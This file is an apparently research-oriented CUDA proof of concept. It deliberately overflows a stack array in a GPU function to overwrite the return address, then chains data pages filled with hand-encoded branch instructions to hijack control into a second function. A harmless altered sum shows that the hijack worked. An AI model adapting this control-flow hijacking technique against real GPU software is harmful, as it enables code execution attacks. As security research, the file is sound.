#include "stdio.h"
#include "stdlib.h"
#include "fcntl.h"
#include "errno.h"
#include "inttypes.h"
#include "sys/mman.h"
#include "cuda_runtime.h"
#include "sched.h"
#include "unistd.h"

#define PAGE_SIZE (2*1024*1024)
#define PAGE_NUM 16
#define ALLOC_SIZE 1024*128

/* 
    modify the following values based on the info from cuda-gdb.
    BUF_ADDR_START is the value of list[0].
    SUM1_ADDR and SUM2_ADDR are the base addrs of sum1 and sum2.
    RET_OFFSET is the the correct return addr in sum1 (when it's called by sum1), 
    relative to the base addr of sum1.
    DIS_RET_ADDR is the distance (in 4B) between arr[0] and return addr on the stack of 
    sum1 (when it's called by sum1).
*/
#define BUF_ADDR_START 0x7fffd7c00000
#define SUM1_ADDR 0x7fffd6facf00
#define SUM2_ADDR 0x7fffd6faf200
#define RET_OFFSET 0x9e0
#define DIS_RET_ARR 21

/* 
    modify the following values to control buffer overflow.
    The return addr in sum1 (line 92) is overwritten when ARR_OFFSET = DIS_RET_ARR.
    When the return happens, it returns to the data page at list[0] and executes the 
    data (interpreted as instructions) in this page. 
    The page at list[0] has a BRA instruction that jumps to the page at list[1].
    The page at list[1] has a BRA instruction that jumps to the page at list[2].
    ...
    The page at list[PAGE_NUM-1] has a BRA instruction that jumps to sum2.
    When code in sum2 is executed, it returns the wrong result to k1.
    With no overflow, the correct result (printed) is 1.
    With overflow, the wrong result (printed) is 11.
*/    
#define ARR_OFFSET 21




typedef uint32_t(*pF)(uint32_t k, uint32_t*a, uint32_t depth, uint32_t value_ptr, uint32_t arr_idx);
extern int errno;



/*
    sum2 should never be executed (unless buffer overflow happens).
    The only difference between sum2 and sum1 is line 67; an extra "10" is added in sum2.
*/
__device__ __noinline__
uint32_t sum2(uint32_t k, uint32_t*a,  uint32_t depth,  uint32_t value_ptr, uint32_t arr_idx)
{
    uint32_t arr1[16];
    for(int i = 0; i < 16; i++){
        arr1[i] = 0xdeadbeef * a[i+depth];
    }
    arr1[arr_idx] = BUF_ADDR_START - 0x7fff00000000;

    if(k > 0)
        return(a[value_ptr]+ sum2(k-1, a,  depth+1, value_ptr+1, arr_idx+ARR_OFFSET)+10);
    else
    {
        
        uint32_t m = 1;
        return m+a[value_ptr];
    }

}

/*
   sum1 provides the summation of cetain items in the buffer "a".
   arr1 does not contribute to the summation result, but it can trigger a buffer overflow, 
   depending on ARR_OFFSET.
   depth is used to avoid compiler optimization.   
*/

__device__ __noinline__
uint32_t sum1(uint32_t k, uint32_t*a,  uint32_t depth,  uint32_t value_ptr, uint32_t arr_idx)
{
    uint32_t arr1[16];
    for(int i = 0; i < 16; i++){
        arr1[i] = 0xdeadbeef * a[i+depth];
    }

    arr1[arr_idx] = BUF_ADDR_START - 0x7fff00000000;

    if(k > 0)
        return(a[value_ptr] + sum1(k-1, a,  depth+1, value_ptr+1, arr_idx+ARR_OFFSET));
    else
    {
        
        uint32_t m = 1;
        return m+a[value_ptr];
    }

}


/*
   mem_init initiates the gpu buffer "a".
   k1 performs a summation over items within the range of a[0] to a[99].
   a[100] and a[101] are used to store some metadata for the summation.
*/
__global__
void mem_init (uint32_t *a, bool value)
{

    for(uint64_t x = 0; x < ALLOC_SIZE/sizeof(uint32_t); x++)
        a[x] = x%1;
    a[100] = 13; //a[100] stores value_idx for sum1.
    a[101] = 0;  //a[101] stores arr_idx for sum1.

}



__global__
void k1 (uint32_t* a, uint32_t* b, uint64_t* list_start)
{
    uint32_t m = 1;
    
    pF fp[2]; //use function pointer to get the function addrs.
    fp[0] = sum1;
    fp[1] = sum2;

    /* perform summation over two items in the buffer "a" */
    m = sum1(0x1, a, 0, a[100],a[101]);
    b[0] = m;
        
}


/* Write a BRA instruction in page1, with the jumping target being page2.*/
__global__ void
link(uint64_t *page1, uint64_t *page2)
{
    int64_t addr1 = (int64_t)page1 + 16;
    int64_t addr2 = (int64_t)page2;
    int64_t offset = addr2 - addr1;
    
    uint64_t offset_lo = (offset & 0x00000000FFFFFFFF) << 32;
    uint64_t offset_hi = (offset >> 32) & 0x000000000003FFFF;
    
    uint64_t bra_lo = 0x0000000000007947 | offset_lo;
    uint64_t bra_hi = 0x003fde0003800000 | offset_hi;
    
    page1[0] = bra_lo;
    page1[1] = bra_hi;
}



int main()
{

    
    setvbuf(stdout, NULL, _IOLBF, 0);
    cudaError_t status;

    uint32_t *da;
    status = cudaMalloc((void**)&da, ALLOC_SIZE);
    if(status != cudaSuccess)
        printf("ERROR!!!\n");

    uint32_t *db;
    status = cudaMallocManaged((void**)&db, sizeof(uint32_t));
    if(status != cudaSuccess)
        printf("ERROR!!!\n");

    mem_init<<<1, 1>>>(da, 1);
    cudaDeviceSynchronize();

    uint64_t *list[PAGE_NUM]; //the linked data pages

    for(int i = 0; i < PAGE_NUM; i++)
    {
        status = cudaMalloc(&list[i], PAGE_SIZE);
        if(status != cudaSuccess)
            printf("ERROR!!!\n");
    }

    /* Fill the first (PAGE_NUM-1) pages with BRA instructions to link them. */
    for(int i = 0; i < PAGE_NUM - 1; i++)
        link<<<1,1>>>(list[i], list[i+1]);
    cudaDeviceSynchronize();

    //uint64_t* ptr_tmp = (uint64_t*)(SUM1_ADDR+RET_OFFSET);
    uint64_t* ptr_tmp = (uint64_t*)(SUM2_ADDR+RET_OFFSET);

    /* The BRA instruction in the last page jumps to sum2.*/
    link<<<1,1>>>(list[PAGE_NUM-1], ptr_tmp);
    cudaDeviceSynchronize();
    
    k1<<<1, 1>>>(da, db, list[0]);
    cudaDeviceSynchronize();


    status = cudaGetLastError();
    if(status != cudaSuccess)
        printf("%s\n", cudaGetErrorString(status));
    else
        printf("%u\n", db[0]);

    return 0;
}

